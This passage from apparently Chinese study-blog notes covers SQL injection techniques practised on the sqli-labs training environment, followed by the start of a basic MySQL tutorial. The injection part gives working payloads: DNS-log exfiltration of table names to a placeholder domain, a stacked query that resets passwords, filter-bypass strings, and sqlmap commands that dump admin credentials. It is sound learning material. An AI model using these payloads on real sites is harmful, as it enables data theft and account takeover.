class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> load_file(concat(&quot;//&quot;,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),&quot;.域名/任意文件&quot;))) <span class="hljs-comment">--+</span><br>使用<span class="hljs-keyword">limit</span>控制显示<br><br>获得列名<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> load_file(concat(&quot;//&quot;,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=tablename <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),&quot;.域名/任意文件&quot;))) <span class="hljs-comment">--+</span><br><br>获得数据类似<br></code></pre></td></tr></table></figure><p>注意：域名前要加’.’，并且必须使用concat拼接否则无法执行</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>函数addslashes()</p><p><img src="/../image/addslashes.png"></p><hr><p>addslashes()过滤作用</p><p><img src="/../image/addslashes%E8%BF%87%E6%BB%A4%E4%BD%9C%E7%94%A8.png"></p><p>宽字节注入主要用来对抗addslashes()过滤</p><p>GBKB编码和宽字节注入原理：</p><p><img src="/../image/GBKB%E7%BC%96%E7%A0%81.png"></p><p>宽字节注入前提：要求对方Mysql数据库的编码方式是GBK编码，并且发请求时声明客户端用的也是GBK编码</p><p>注入步骤（less-32）：</p><p><img src="/../image/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4.png"></p><h3 id="偏移量注入"><a href="#偏移量注入" class="headerlink" title="偏移量注入"></a>偏移量注入</h3><p>适用场景：知道表名，但是不知道列名时可以使用偏移量注入；但是实现条件苛刻</p><p>注意：联合查询前面的查询语句列数要比注入的union后面的查询列数要多才能用偏移量注入</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users;<br></code></pre></td></tr></table></figure><p>如果要控制回显的内容只需要控制*号的位置即可，因为查询所有数据但是可能页面只展示几列数据，且列与列需要对应</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">例如：<br>注意：如果<span class="hljs-operator">*</span>在中间或者后面写的时候格式：表名.<span class="hljs-operator">*</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,users.<span class="hljs-operator">*</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,users.<span class="hljs-operator">*</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,users.<span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<br></code></pre></td></tr></table></figure><p>控制偏移：</p><p><img src="/../image/%E5%81%8F%E7%A7%BB%E9%87%8F%E6%B3%A8%E5%85%A5.png"></p><h3 id="加密注入"><a href="#加密注入" class="headerlink" title="加密注入"></a>加密注入</h3><p>前端提交的有些数据是加密之后，到了后台再解密，然后再进行数据库查询等相关操作的，那么既然如此我们也应该将注入语句按照相同的加密方式，加密后再进行注入</p><p>步骤：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.先将前端提交数据解密<br>2.添加注入语句<br>3.将添加后的语句再加密然后发送<br></code></pre></td></tr></table></figure><p>例如：<img src="/../image/%E5%8A%A0%E5%AF%86%E6%B3%A8%E5%85%A5.png"></p><p>注意：如果发现前端提交数据中有一个或两个等号，一般是base64编码，当然也可能没有等号</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠查询也叫堆叠注入，在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。以sqli-labs第38关为例</p><p><img src="/../image/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A51.png"></p><p>执行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=1&#x27;;update<span class="hljs-built_in"> users </span><span class="hljs-built_in">set</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;123456&#x27;</span> where <span class="hljs-attribute">id</span>=1; --+ <br></code></pre></td></tr></table></figure><p>意思就是再更新id&#x3D;1的用户密码为123456。如下成功执行了更新密码的语句</p><p><img src="/../image/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A52.png"></p><p>堆叠查询的局限性</p><pre><code>   堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。如上面的实例如果我们不输出密码那我们是看不到这个结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</code></pre><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>什么是二次注入：</p><p>简单的说，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p><p>网站对我们输入的一些重要的关键字进行了转义，但是这些我们构造的语句已经写进了数据库，可以在没有被转义的地方使用</p><p>可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。</p><p>二次注入原理：</p><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p><p>图示：</p><p><strong>二次注入的原理，主要分为两步</strong></p><p><strong>第一步：插入恶意数据</strong></p><p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p><p><strong>第二步：引入恶意数据</strong></p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。早下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p><p><img src="/../image/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A52.png"></p><p><strong>二次注入示例：</strong></p><p>*<strong>寻找插入数据库，并会转义的操作*</strong></p><p>输入参数1’ –&gt;参数经过转义函数1\‘ –&gt;参数进入数据库还原为1’</p><p>*<strong>寻找另一处引用这个数据的操作*</strong></p><p>将1‘从数据库中取出–&gt;取出后直接给变量并带入SQL–&gt;SQL注入触发</p><p>示例：sqli-libs Less-24</p><p><img src="/../image/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5.png"></p><p>利用二次注入修改密码从而得到密码</p><h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h3><p>大体意思就是将传参用base64编码,再与url进行拼接。在开启htt服务用sqlmap或其他工具进行测试这个文件即可.</p><p>首先构造文件:</p><p><img src="/../image/%E4%B8%AD%E8%BD%AC%E6%B3%A8%E5%85%A5.png"></p><p>大体意思就是将传参用base64编码,再与url进行拼接。</p><p>其中base64_decode()函数是将传入的参数进行base64编码。</p><p>file_get_contents()函数是用来将文件的内容读入到一个字符串中的首选方法。</p><h3 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h3><p>在日常的测试中，经常会遇到静态页面，尤其是政府类的站点（前提经过授权），此时就会非常的棘手，在下多试验后，发现以下思路或可以帮助我们跨越这个障碍。</p><p>伪静态即是网站本身是动态网页如.php、.asp、.aspx等格式动态网页有时这类动态网页还跟“?”加参数来读取数据库内不同资料。很典型的案例即是discuz论坛系统，后台就有一个设置伪静态功能，开启伪静态后，动态网页即被转换重写成静态网页类型页面，通过浏览器访问地址和真的静态页面没区别。前提服务器支持伪静态重写URL Rewrite功能</p><p>判断方法：</p><p>在浏览器里控制台（console),输入代码或粘贴js代码</p><p>alert(document.lastModified); 回车执行，会弹出一个弹窗。</p><p><img src="https://md-1312988675.cos.ap-nanjing.myqcloud.com/wenimg/202409140959227.png?imageSlim" alt="image-20240914095932187"></p><p>重新刷新网页，再用相同的方法在控制台里输入查询代码，再查看文件的最后修改时间，如果发现<strong>时间不同</strong>则可以判断它是伪静态。</p><p><img src="https://md-1312988675.cos.ap-nanjing.myqcloud.com/wenimg/202409141000934.png?imageSlim" alt="image-20240914100039887"></p><p>如果是伪静态页面，可以尝试将其变成动态页面。伪静态的话只是由动态转成了静态，从地址上你是可以看到转递参数的，比如phpweb，它的链接是这样的：news&#x2F;?123.html，这个你可以理解成news.php?id&#x3D;123。所以你可以news&#x2F;?123*.html这样提交。或者可以进行伪静态中转。（伪静态中转注入总结：博客园地址）</p><p>入侵的大概思维方式</p><p>对搜索框进行测试（注入测试）<br> 对登录处进行测试（万能密码、注入）<br> 对站点进行目录扫描（发现其他突破口）<br> 从C段下手</p><h3 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h3><h4 id="注释符过滤"><a href="#注释符过滤" class="headerlink" title="注释符过滤"></a>注释符过滤</h4><p><img src="/../image/%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87.png"></p><h4 id="and-和or过滤绕过"><a href="#and-和or过滤绕过" class="headerlink" title="and 和or过滤绕过"></a>and 和or过滤绕过</h4><p>过滤源代码</p><p><img src="/../image/and%E5%92%8Cor%E8%BF%87%E6%BB%A4.png"></p><p>使用场景：</p><p>在报错内发现and和or被过滤</p><p>简单常用的绕过手法</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1.使用大小写绕过<br>例如：?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">anD</span> <span class="hljs-attribute">1</span>=1--+<br><br>2.复写过滤字符<br>例如：?<span class="hljs-attribute">id</span>=1&#x27; anandd <span class="hljs-attribute">1</span>=1--+<br><br>3.用&amp;&amp;取代<span class="hljs-keyword">and</span>，用||取代<span class="hljs-keyword">or</span><br>例如：?<span class="hljs-attribute">id</span>=1&#x27; &amp;&amp; <span class="hljs-attribute">1</span>=1--+<br>注意：尝试未成功可以转换成url编码再试一遍<br></code></pre></td></tr></table></figure><h4 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h4><p>使用场景：</p><p><img src="/../image/%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%872.png"></p><p>发现空格被过滤</p><p><img src="/../image/%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87.png"></p><p>例子：less-26</p><p><img src="/../image/%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A43.png"></p><p>逐个测试发现%A0可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;union%A0select%A01,database(),3%A0oorr&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>注意：这里or也被过滤了所以要使用复写,且注释符被过滤<br></code></pre></td></tr></table></figure><p>如果还是不行尝试报错注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;||extractvalue(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(database())))||&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br>没有用到空格<br><br>查表名<br><span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(infoorrmation_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())<br>注意：这里<span class="hljs-keyword">or</span>被过滤所以复写<br><br>查列名<br><span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(infoorrmation_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())anandd(<span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)<br><br>查内容<br><span class="hljs-keyword">select</span>(concat(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(users)<span class="hljs-keyword">where</span>(id=<span class="hljs-number">1</span>)<br><br>多用括号()以达到不适用空格的效果<span class="hljs-keyword">and</span>和<span class="hljs-keyword">or</span>复写<br></code></pre></td></tr></table></figure><p>limit替换函数</p><p><img src="/../image/limit%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0.png"></p><h4 id="逗号过滤绕过"><a href="#逗号过滤绕过" class="headerlink" title="逗号过滤绕过"></a>逗号过滤绕过</h4><p>join绕过逗号限制的原理</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">使用<span class="hljs-keyword">join</span>:<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> #等价于<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c<span class="hljs-punctuation">;</span><br><br>例如：<br>查表名<br>?id=-<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=database())c<span class="hljs-punctuation">;</span><br><br>查内容时<br>?id=-<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users)c<span class="hljs-punctuation">;</span><br>?id=-<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> group_concat(password) <span class="hljs-keyword">from</span> users)c<span class="hljs-punctuation">;</span><br><br>由于逗号被过滤所以只能一个个查<br></code></pre></td></tr></table></figure><p>适用场景：</p><p>报错后发现逗号被过滤</p><h4 id="绕过union和select过滤"><a href="#绕过union和select过滤" class="headerlink" title="绕过union和select过滤"></a>绕过union和select过滤</h4><p><img src="/../image/union%E5%92%8Cselect%E7%BB%95%E8%BF%87.png"></p><p>还可以使用报错注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;||updatexml(1,concat(&#x27;</span>$<span class="hljs-string">&#x27;,(database())),0)or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br></code></pre></td></tr></table></figure><p>还可以尝试url编码绕过</p><p><img src="/../image/union%E5%92%8Cselect%E7%BB%95%E8%BF%872.png"></p><h3 id="sqlmap工具的使用"><a href="#sqlmap工具的使用" class="headerlink" title="sqlmap工具的使用"></a>sqlmap工具的使用</h3><h4 id="①检查注入点："><a href="#①检查注入点：" class="headerlink" title="①检查注入点："></a>①检查注入点：</h4><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11</p><h4 id="②爆所有数据库信息："><a href="#②爆所有数据库信息：" class="headerlink" title="②爆所有数据库信息："></a>②爆所有数据库信息：</h4><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 –dbs</p><h4 id="③爆当前数据库信息："><a href="#③爆当前数据库信息：" class="headerlink" title="③爆当前数据库信息："></a>③爆当前数据库信息：</h4><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 –current-db</p><h4 id="④指定库名列出所有表"><a href="#④指定库名列出所有表" class="headerlink" title="④指定库名列出所有表"></a>④指定库名列出所有表</h4><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 -D vhost48330 –tables</p><p>‘vhost48330’ 为指定数据库名称</p><h4 id="⑤指定库名表名列出所有字段"><a href="#⑤指定库名表名列出所有字段" class="headerlink" title="⑤指定库名表名列出所有字段"></a>⑤指定库名表名列出所有字段</h4><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 -D vhost48330 -T admin –columns<br> ‘admin’ 为指定表名称</p><h4 id="⑥指定库名表名字段dump出指定字段"><a href="#⑥指定库名表名字段dump出指定字段" class="headerlink" title="⑥指定库名表名字段dump出指定字段"></a>⑥指定库名表名字段dump出指定字段</h4><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 -D vhost48330 -T admin -C ac，id，password –dump<br> ‘ac,id,password’ 为指定字段名称</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL</title>
      <link href="/2024/12/29/MySQL/"/>
      <url>/2024/12/29/MySQL/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>数据库的相关概念：</p><p><img src="/../image/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E5%BF%B5.png"></p><p>客户端的连接：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">mysql -u root -<span class="hljs-selector-tag">p</span><br>mysql <span class="hljs-selector-attr">[-h 指定主机地址]</span> <span class="hljs-selector-attr">[-P 指定连接端口]</span> -u 指定连接用户名 -<span class="hljs-selector-tag">p</span> 指定密码<br></code></pre></td></tr></table></figure><p>数据模型：</p><p><img src="/../image/%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B.png"></p><p>关系型数据库</p><p>概念：建立在关系模型基础上，由多张相互连接的二维表组成的数据库</p><p>特点：</p><p>1.使用表结构存储数据，格式统一，便于维护</p><p>2.使用SQL语言操作，标准统一，使用方便</p><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="SQL通用语法及分类"><a href="#SQL通用语法及分类" class="headerlink" title="SQL通用语法及分类"></a>SQL通用语法及分类</h2><h3 id="SQL通用语法"><a href="#SQL通用语法" class="headerlink" title="SQL通用语法"></a>SQL通用语法</h3><ol><li><p>SQL语句可以单行或多行书写，以分号结尾。</p></li><li><p>SQL语句可以使用空格&#x2F;缩进来增强语句的可读性。</p></li><li><p>MySQL数据库的SQL语句不区分大小写，关键字建议使用大写</p></li><li><p>注释：</p><p>单行注释：–注释内容 或者 # 注释内容（MySQL特有）</p><p>多行注释：&#x2F;*注释内容*&#x2F;</p></li></ol><h2 id="SQL分类"><a href="#SQL分类" class="headerlink" title="SQL分类"></a>SQL分类</h2><p>SQL分类：</p><p><img src="/../image/SQL%E5%88%86%E7%B1%BB.png"></p><h2 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h2><h3 id="DDL-数据库操作"><a href="#DDL-数据库操作" class="headerlink" title="DDL-数据库操作"></a>DDL-数据库操作</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询<br>查询所有数据库<br><span class="hljs-keyword">SHOW</span> DATABASES;<br>查询当前数据库<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DATABASE</span>()<br><br>创建<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span>[<span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span>]数据库名[<span class="hljs-keyword">DEFAULT</span> CHARSET字符集][<span class="hljs-keyword">COLLATE</span> 排序规则];<br>删除<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">DATABASE</span>[<span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span>]数据库名;<br>使用<br>USE 数据库名;<br><br>注意：[]的内容都是可选的<br></code></pre></td></tr></table></figure><h3 id="DDL-表操作-查询"><a href="#DDL-表操作-查询" class="headerlink" title="DDL-表操作-查询"></a>DDL-表操作-查询</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询当前数据库所有表<br><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">TABLES</span>;<br>查询表结构<br><span class="hljs-keyword">DESC</span> 表名;<br>查询指定表的建表语句;<br><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> 表名;<br><br>注意：前提是需要先进入该数据库即使用use 数据库名;<br></code></pre></td></tr></table></figure><h3 id="DDL-表操作-创建"><a href="#DDL-表操作-创建" class="headerlink" title="DDL-表操作-创建"></a>DDL-表操作-创建</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">CREATE <span class="hljs-selector-tag">TABLE</span> 表名(<br>字段<span class="hljs-number">1</span> 字段<span class="hljs-number">1</span>类型<span class="hljs-selector-attr">[COMMENT 字段1注释]</span>,<br>字段<span class="hljs-number">2</span> 字段<span class="hljs-number">2</span>类型<span class="hljs-selector-attr">[COMMENT 字段2注释]</span>,<br>字段<span class="hljs-number">3</span> 字段<span class="hljs-number">3</span>类型<span class="hljs-selector-attr">[COMMENT 字段3注释]</span>,<br>......<br>字段n 字段n类型<span class="hljs-selector-attr">[COMMENT 字段n注释]</span><br>)<span class="hljs-selector-attr">[COMMENT 表注释]</span>;<br><br>注意：<span class="hljs-selector-attr">[...]</span>为可选参数，最后一个字段后面没有逗号<br></code></pre></td></tr></table></figure><p>创建该表：</p><p><img src="/../image/%E8%A1%A8%E6%93%8D%E4%BD%9C-%E5%88%9B%E5%BB%BA1.png"></p><p>语法：</p><p><img src="/../image/%E8%A1%A8%E6%93%8D%E4%BD%9C-%E5%88%9B%E5%BB%BA2.png"></p><p>创建成功使用show tables查看：</p><p><img src="/../image/%E8%A1%A8%E6%93%8D%E4%BD%9C-%E5%88%9B%E5%BB%BA3.png"></p><p>可以看到tb_user已经创建成功</p><h3 id="DDL-表操作-数据类型"><a href="#DDL-表操作-数据类型" class="headerlink" title="DDL-表操作-数据类型"></a>DDL-表操作-数据类型</h3><p>MySQL中的数据类型有很多，主要分为三类：数值类型、字符串类型、日期时间类型</p><h4 id="数值类型："><a href="#数值类型：" class="headerlink" title="数值类型："></a>数值类型：</h4><p><img src="/../image/%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B.png"></p><p>DECIMALM(精度)指长度D(标度)指小数点后长度</p><p>例如：<br>age TINYINT UNSIGNED; 无符号类型 unsigned</p><p>score double(4,1)；表示长度为4，1位小数</p><h4 id="字符串类型："><a href="#字符串类型：" class="headerlink" title="字符串类型："></a>字符串类型：</h4><p><img src="/../image/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B.png"></p><p>char(x)和varchar(x)后都要带参数,表示字符串能够存储的最大字符长度</p><p>char固定长度未被赋值的取余将被空格代替,最大长度是多少就占用多少空间</p><p>varchar会根据所存储的内容去计算占用的空间，有多少字符就占用多少空间</p><p>区别：</p><p>​char()性能好</p><p>​varchar()性能较差</p><p>例如：</p><p>用户名usernamevarchar(50)不定长</p><p>性别genderchar(1)定长</p><h4 id="日期类型："><a href="#日期类型：" class="headerlink" title="日期类型："></a>日期类型：</h4><p><img src="/../image/%E6%97%A5%E6%9C%9F%E7%B1%BB%E5%9E%8B.png"></p><p>常用：DATETIMEDATETIME</p><p>样例：</p><p>使用合适的数值类型来储存数据</p><p><img src="/../image/%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B1.png"></p><p>结果：</p><p><img src="/../image/%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B2.png"></p><h3 id="DDL-表操作-修改"><a href="#DDL-表操作-修改" class="headerlink" title="DDL-表操作-修改"></a>DDL-表操作-修改</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">添加字段<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 <span class="hljs-keyword">ADD</span> 字段名 类型(长度) [<span class="hljs-keyword">COMMENT</span> 注释] [约束];<br><br>修改字段<br>修改数据类型<br><span class="hljs-keyword">ALTER</span> 